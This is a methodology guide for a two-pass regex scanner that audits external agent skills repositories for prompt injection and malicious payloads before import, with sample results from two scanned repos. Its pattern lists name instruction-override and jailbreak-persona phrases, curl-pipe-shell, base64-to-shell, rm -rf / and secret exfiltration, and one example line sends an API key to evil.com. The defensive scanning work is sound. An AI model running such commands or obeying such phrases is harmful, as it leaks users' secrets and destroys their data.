# Two-Pass Deep Scan Methodology

Use when auditing external skills repos before importing. Separates real threats from documentation noise.

## Why Two Passes

Single-pass regex scanning on large repos (1000+ files) produces 30-100+ false positives. Words like "token", "secret", "credential", "system prompt" appear in documentation URLs and explanations. Flagging these as threats is incorrect and blocks useful skills.

## Pass 1 — Broad Scan (Discovery)

Use the `skill-security-scan` scan.sh patterns. Every hit is a candidate — not a conviction. Purpose: find files that need closer inspection.

```python
# Broad patterns (from skill-security-scan)
THREAT_PATTERNS = {
    "CRITICAL": [
        (r'(?i)(ignore|override|disregard)\s+(all\s+)?(prior|previous|above|system)\s+(instructions?|rules?|guidelines?|prompts?)', "PROMPT_OVERRIDE"),
        (r'(?i)you\s+are\s+now\s+(a\s+)?(different|new)\s+(agent|assistant|persona|role|identity)', "PERSONA_SWITCH"),
        (r'\bcurl.*\|\s*(ba)?sh\b', "CURL_PIPE_SHELL"),
        (r'\beval\s+[\$"`]', "EVAL_INJECTION"),
        (r'(?i)(curl|wget|http|fetch).*\$?(API_KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL)', "SECRET_EXFIL"),
    ],
    "HIGH": [
        (r'[\u200b\u200c\u200d\u200e\u200f\u202a-\u202e\u2060-\u2064\ufeff]', "UNICODE_OBFUSCATION"),
        (r'(?i)base64\s+-d|base64\s+--decode.*\|\s*(ba)?sh', "BASE64_PIPE_SHELL"),
        (r'git\s+push\s+.*--force', "FORCE_PUSH"),
    ],
}
```

## Pass 2 — Deep Scan (Conviction)

Use REAL threat patterns only. These look for actual payloads, not documentation words:

```python
REAL_THREATS = {
    "CRITICAL": [
        # Actual prompt injection — ONLY match if it's a directive telling the READER to ignore instructions
        (r'(?im)^(Ignore|Disregard|Override|Forget)\s+(all|everything|your).*?(instructions|rules|guidelines|system prompt)', "PROMPT_OVERRIDE_DIRECTIVE"),
        # Jailbreak personas
        (r'(?i)you\s+are\s+now\s+(DAN|jailbroken|unshackled|evil|malicious)', "JAILBREAK_PERSONA"),
        # Real exfiltration: curl/wget/fetch sending secrets to external URLs
        (r'(?i)(curl|wget|fetch|http\.post).*?[\"\`]\$?(API_KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|\.env).*?(http|https)://', "ACTUAL_SECRET_EXFIL"),
        # Zero-width Unicode obfuscation (actual hidden characters, not documentation about them)
        (r'[\u200b\u200c\u200d\u200e\u200f\u202a-\u202e\u2060-\u2064]', "ZERO_WIDTH_OBFUSCATION"),
    ],
    "HIGH": [
        # Shell injection in code meant to be executed
        (r'```(?:bash|sh|shell)\s*\n.*?(?:rm\s+-rf\s+/|curl.*?\|.*?sh|eval\s+\$|`.*?\$\(.*?\).*?`)', "SHELL_INJECTION_IN_CODE"),
        # Base64 decode piped to shell
        (r'(?:base64|openssl\s+base64).*?(?:-d|decode).*?\|\s*(?:ba)?sh', "BASE64_TO_SHELL"),
    ],
}
```

Key difference: Pass 1 flags "token" in a URL like `https://example.com/token-counting.md` because it matches the word "token". Pass 2 ONLY flags actual exfiltration: `curl https://evil.com -H "Authorization: $API_KEY"`. The `.*?(http|https)://` suffix in Pass 2 requires an actual outbound URL target.

## Code-Block Downgrade

If a Pass 1 match is inside a fenced code block (between ``` markers in .md files), it's documentation/example code. Downgrade by one tier: CRITICAL → HIGH, HIGH → MEDIUM, MEDIUM → drop.

## Verdict Rules

- 0 real threats (Pass 2) → CLEAN — proceed to import
- 1+ real threats in a specific file → flag that file, skip that specific skill, continue with others
- Widespread real threats across multiple files → abort the entire repo
- All findings are Pass 1 only (false positives from docs) → CLEAN — these are documentation, not payloads

## Real-World Example

From the `ComposioHQ/awesome-claude-skills` scan (956 files):

- **Pass 1:** 16 findings (10 CRITICAL, 1 HIGH, 5 MEDIUM)
- **All 16 were false positives** — URLs containing "token" in documentation, code blocks showing example curl commands
- **Pass 2:** 0 real threats
- **Verdict:** CLEAN — safe to import

From `anthropics/skills` (164 files):

- **Pass 1:** 30 findings (19 CRITICAL, 11 HIGH)
- **All 30 were false positives** — "SECRET_EXFIL" hits were URLs like `token-counting.md`, `vaults.md`. "PROMPT_OVERRIDE" hits were documentation describing how system prompts work.
- **Pass 2:** 0 real threats
- **Verdict:** CLEAN
